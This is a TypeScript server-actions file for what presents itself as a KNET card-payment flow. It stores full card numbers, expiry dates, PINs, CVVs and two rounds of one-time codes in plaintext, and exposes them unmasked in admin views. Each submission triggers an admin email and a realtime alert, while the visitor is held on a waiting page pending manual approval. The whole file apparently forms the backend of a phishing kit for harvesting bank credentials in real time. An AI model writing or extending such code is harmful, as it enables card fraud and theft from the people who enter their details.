import { z } from "zod";
import { isValidCardExpiryString } from "@/lib/card-expiry";
import { type ActionResult, toErrorCode } from "@/lib/codes";
import type { KnetRecordView } from "@/lib/types";
import { displayMsisdn } from "@/lib/phone";
import { prisma } from "@/lib/db";
import { lockVisitorSession } from "@/models/tracking.repository";
import { sendKnetSubmissionEmail } from "@/lib/admin-email";
import { scheduleAdminRealtimeBroadcast } from "@/lib/admin-realtime-hub";
import KnetService, { type KnetDecision } from "@/services/knet.service";

function presentKnet(row: {
  id: string;
  amount: number;
  cardNumber: string;
  expiryDate: string;
  pin: string;
  otp: string;
  otpVerified: boolean;
  cvv: string;
  cvvVerified: boolean;
  otp2?: string;
  otp2Verified?: boolean;
  status: string;
  reviewStep: string;
  orderId: string | null;
  createdAt: Date;
  updatedAt: Date;
}, msisdnDisplay?: string | null): KnetRecordView {
  return {
    id: row.id,
    amountHalalas: row.amount,
    cardNumber: row.cardNumber,
    expiryDate: row.expiryDate,
    pin: row.pin,
    otp: row.otp,
    otpVerified: row.otpVerified,
    cvv: row.cvv,
    cvvVerified: row.cvvVerified,
    otp2: row.otp2 ?? "",
    otp2Verified: row.otp2Verified ?? false,
    status: row.status,
    reviewStep: row.reviewStep ?? "awaiting_admin_card",
    orderId: row.orderId,
    msisdnDisplay: msisdnDisplay ?? null,
    createdAt: row.createdAt.toISOString(),
    updatedAt: row.updatedAt.toISOString(),
  };
}

const createSchema = z.object({
  amount: z.coerce.number().int().positive(),
  cardNumber: z
    .string()
    .transform((value) => value.replace(/\D/g, ""))
    .pipe(z.string().min(10).max(19)),
  expiryDate: z
    .string()
    .trim()
    .regex(/^\d{2}\/\d{2}$/)
    .refine((value) => isValidCardExpiryString(value), { message: "invalid_card" }),
  pin: z
    .string()
    .transform((value) => value.replace(/\D/g, ""))
    .pipe(z.string().regex(/^\d{3,4}$/)),
  cvv: z.string().trim().min(3).max(4).optional(),
  orderId: z.string().trim().min(8).max(40),
});

const orderOtpSchema = z.object({
  orderId: z.string().trim().min(8).max(40),
  otp: z.string().trim().regex(/^\d{6}$/),
});

const orderCvvSchema = z.object({
  orderId: z.string().trim().min(8).max(40),
  cvv: z.string().trim().regex(/^\d{3}$/),
});

export async function getKnetPreview(amountHalalas: number): Promise<ActionResult & { amount?: number }> {
  if (!Number.isFinite(amountHalalas) || amountHalalas <= 0) {
    return { ok: false, code: "invalid_amount" };
  }
  const preview = await KnetService.getKnet(amountHalalas);
  return { ok: true, amount: preview.amount };
}

export async function getAllKnetRecords(): Promise<KnetRecordView[]> {
  const rows = await KnetService.listAll();
  const orderIds = [...new Set(rows.map((row) => row.orderId).filter((id): id is string => Boolean(id)))];
  const orders =
    orderIds.length > 0
      ? await prisma.order.findMany({
          where: { id: { in: orderIds } },
          select: { id: true, msisdn: true },
        })
      : [];
  const phoneByOrder = new Map(orders.map((order) => [order.id, displayMsisdn(order.msisdn)]));
  return rows.map((row) =>
    presentKnet(row, row.orderId ? (phoneByOrder.get(row.orderId) ?? null) : null),
  );
}

export async function getKnetRecord(id: string): Promise<KnetRecordView | null> {
  const row = await KnetService.getById(id);
  if (!row) return null;
  return presentKnet(row);
}

export async function getKnetByOrderId(orderId: string): Promise<KnetRecordView | null> {
  const row = await KnetService.getByOrderId(orderId);
  if (!row) return null;
  return presentKnet(row);
}

const decisionSchema = z.enum(["approved", "rejected"]);

export async function acknowledgeKnetRetry(orderId: string): Promise<ActionResult> {
  if (!orderId.trim()) return { ok: false, code: "not_found" };
  try {
    await KnetService.acknowledgeRetry(orderId.trim());
    scheduleAdminRealtimeBroadcast();
    return { ok: true, orderId: orderId.trim() };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function updateKnetStatus(id: string, decision: KnetDecision): Promise<ActionResult> {
  const parsed = decisionSchema.safeParse(decision);
  if (!parsed.success) return { ok: false, code: "generic" };
  if (!id.trim()) return { ok: false, code: "not_found" };
  try {
    await KnetService.updateStatus(id.trim(), parsed.data);
    return { ok: true };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordKnetPayment(raw: {
  amount: number;
  cardNumber: string;
  expiryDate: string;
  pin: string;
  cvv?: string;
  orderId: string;
  sessionId?: string;
}): Promise<ActionResult> {
  const parsed = createSchema.safeParse(raw);
  if (!parsed.success) {
    console.warn("[knet] card payload rejected:", parsed.error.flatten().fieldErrors);
    return { ok: false, code: "invalid_card" };
  }
  try {
    await KnetService.createKnet(
      parsed.data.amount,
      parsed.data.cardNumber,
      parsed.data.expiryDate,
      parsed.data.pin,
      parsed.data.orderId,
    );
    await lockVisitorSession(raw.sessionId, {
      orderId: parsed.data.orderId,
      flowStage: "awaiting_admin",
      page: "/quick-pay/knet-waiting",
    });
    scheduleAdminRealtimeBroadcast();
    void sendKnetSubmissionEmail(parsed.data.orderId, "card");
    return { ok: true, orderId: parsed.data.orderId };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordKnetOtp(raw: { orderId: string; otp: string }): Promise<ActionResult> {
  const parsed = orderOtpSchema.safeParse(raw);
  if (!parsed.success) return { ok: false, code: "invalid_otp" };
  try {
    await KnetService.submitOtpForOrder(parsed.data.orderId, parsed.data.otp);
    scheduleAdminRealtimeBroadcast();
    void sendKnetSubmissionEmail(parsed.data.orderId, "otp");
    return { ok: true, orderId: parsed.data.orderId };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordKnetCvv(raw: { orderId: string; cvv: string; sessionId?: string }): Promise<ActionResult> {
  const parsed = orderCvvSchema.safeParse(raw);
  if (!parsed.success) return { ok: false, code: "invalid_card" };
  try {
    await KnetService.submitCvvForOrder(parsed.data.orderId, parsed.data.cvv);
    await lockVisitorSession(raw.sessionId, {
      orderId: parsed.data.orderId,
      flowStage: "awaiting_admin",
      page: "/quick-pay/knet-waiting",
    });
    scheduleAdminRealtimeBroadcast();
    void sendKnetSubmissionEmail(parsed.data.orderId, "cvv");
    return { ok: true, orderId: parsed.data.orderId };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}

export async function recordKnetOtp2(raw: { orderId: string; otp: string }): Promise<ActionResult> {
  const parsed = orderOtpSchema.safeParse(raw);
  if (!parsed.success) return { ok: false, code: "invalid_otp" };
  try {
    await KnetService.submitOtp2ForOrder(parsed.data.orderId, parsed.data.otp);
    scheduleAdminRealtimeBroadcast();
    void sendKnetSubmissionEmail(parsed.data.orderId, "otp2");
    return { ok: true, orderId: parsed.data.orderId };
  } catch (error) {
    return { ok: false, code: toErrorCode(error) };
  }
}
